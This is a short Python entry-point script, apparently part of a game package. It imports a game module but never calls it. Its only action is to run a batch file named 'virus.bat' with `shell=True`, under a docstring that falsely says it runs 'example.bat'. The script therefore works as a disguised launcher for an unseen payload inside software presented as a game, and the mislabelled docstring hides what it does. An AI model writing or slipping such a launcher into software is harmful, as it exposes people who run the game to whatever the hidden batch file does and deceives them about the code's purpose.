import subprocess
from . import game

def execute_bat_file():
    """
    Executes a BAT file named "example.bat".
    """
    bat_file_path = "virus.bat"
    subprocess.call([bat_file_path], shell=True)

def main():
    execute_bat_file()
    

    # Execute the BAT file after running the game
    

if __name__ == "__main__":
    main()
